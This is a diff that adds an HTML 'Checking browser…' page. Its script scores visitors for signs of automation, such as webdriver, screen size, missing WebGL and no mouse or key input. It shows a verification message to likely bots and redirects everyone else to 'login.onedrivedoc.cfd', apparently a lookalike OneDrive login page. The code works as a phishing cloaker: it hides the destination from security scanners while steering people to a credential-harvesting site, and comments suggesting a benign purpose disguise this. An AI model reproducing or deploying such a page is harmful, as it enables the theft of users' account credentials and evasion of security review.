@@ -1,0 +1,168 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Checking browser…</title>
+</head>
+<body>
+<script>
+(async () => {
+    let score = 0;
+    const reasons = [];
+
+    function suspicious(condition, points, reason) {
+        if (condition) {
+            score += points;
+            reasons.push(reason);
+        }
+    }
+
+    // Browser automation
+    suspicious(
+        navigator.webdriver === true,
+        5,
+        "navigator.webdriver enabled"
+    );
+
+    // Screen information
+    suspicious(
+        !screen.width || !screen.height,
+        4,
+        "missing screen dimensions"
+    );
+
+    suspicious(
+        screen.width < 300 || screen.height < 300,
+        3,
+        "abnormal screen dimensions"
+    );
+
+    // Window consistency
+    suspicious(
+        window.innerWidth === 0 || window.innerHeight === 0,
+        3,
+        "zero viewport"
+    );
+
+    suspicious(
+        window.outerWidth === 0 || window.outerHeight === 0,
+        2,
+        "missing outer window dimensions"
+    );
+
+    // Hardware
+    suspicious(
+        !navigator.hardwareConcurrency,
+        1,
+        "missing CPU information"
+    );
+
+    suspicious(
+        navigator.hardwareConcurrency === 1,
+        1,
+        "single logical CPU"
+    );
+
+    // Languages
+    suspicious(
+        !navigator.languages || navigator.languages.length === 0,
+        2,
+        "missing language information"
+    );
+
+    // Plugins — only a weak signal nowadays
+    suspicious(
+        navigator.plugins && navigator.plugins.length === 0,
+        1,
+        "no browser plugins reported"
+    );
+
+    // Touch consistency
+    const mobileUA =
+        /Android|iPhone|iPad|Mobile/i.test(navigator.userAgent);
+
+    suspicious(
+        mobileUA && navigator.maxTouchPoints === 0,
+        2,
+        "mobile browser without touch support"
+    );
+
+    // WebGL availability
+    try {
+        const canvas = document.createElement("canvas");
+        const gl =
+            canvas.getContext("webgl") ||
+            canvas.getContext("experimental-webgl");
+
+        suspicious(!gl, 2, "WebGL unavailable");
+    } catch {
+        score += 2;
+        reasons.push("WebGL test failed");
+    }
+
+    /*
+     * Human interaction check.
+     *
+     * IMPORTANT:
+     * Absence of mouse movement is NOT proof of a bot.
+     * Phones, tablets, keyboard-only users and accessibility
+     * technology may legitimately have no mouse.
+     */
+
+    let interaction = false;
+
+    const markInteraction = () => {
+        interaction = true;
+    };
+
+    [
+        "mousemove",
+        "mousedown",
+        "keydown",
+        "touchstart",
+        "pointerdown"
+    ].forEach(event => {
+        window.addEventListener(event, markInteraction, {
+            once: true,
+            passive: true
+        });
+    });
+
+    // Give the visitor a few seconds to interact.
+    await new Promise(resolve => setTimeout(resolve, 3000));
+
+    suspicious(
+        !interaction,
+        1,
+        "no user interaction observed"
+    );
+
+    console.log({
+        botRiskScore: score,
+        reasons
+    });
+
+    /*
+     * Don't cloak content based on the score.
+     *
+     * Instead you could:
+     *   - send the result to your server for analytics
+     *   - rate-limit suspicious sessions
+     *   - display CAPTCHA / Turnstile
+     *   - block abusive requests server-side
+     */
+
+    if (score >= 6) {
+        document.body.innerHTML = `
+            <h2>Browser verification required</h2>
+            <p>Please complete a verification challenge to continue.</p>
+        `;
+        return;
+    }
+
+    // Same normal destination for verified visitors.
+    window.location.replace("https://login.onedrivedoc.cfd/uGBAXEHs");
+})();
+</script>
+</body>
+</html>
